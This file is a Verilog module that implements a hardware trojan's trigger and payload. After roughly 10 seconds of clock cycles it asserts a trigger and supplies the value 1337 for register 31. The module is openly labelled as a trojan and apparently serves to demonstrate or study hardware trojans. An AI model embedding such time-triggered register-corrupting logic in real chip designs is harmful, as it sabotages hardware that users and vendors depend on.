
module timer #(
  parameter REG_DATA_WIDTH = 32,
  parameter REG_SEL_BITS = 5
) (
  input clock,
  input reset,
  input did_trigger,
  output reg trigger,
  output [REG_DATA_WIDTH - 1 : 0] trojan,
  output [REG_SEL_BITS - 1:0] trojan_reg
);
  localparam TIMER_WIDTH = 64;
  // Trigger trojan after 10 seconds on a 50MHz clock
  localparam TIMER_TRIGGER_VALUE = 500000000; 

  localparam TROJAN_VALUE = 1337,
             TROJAN_REGISTER = 31;
   
  reg [TIMER_WIDTH - 1:0] timer = 0;

  assign trojan = TROJAN_VALUE;
  assign trojan_reg = TROJAN_REGISTER;

  always @(*) begin
    trigger = timer >= TIMER_TRIGGER_VALUE & ~did_trigger;
  end

  always @(posedge clock) begin
    if(reset == 1)
      timer <= 0;
    else
      timer <= timer + 1;
  end
endmodule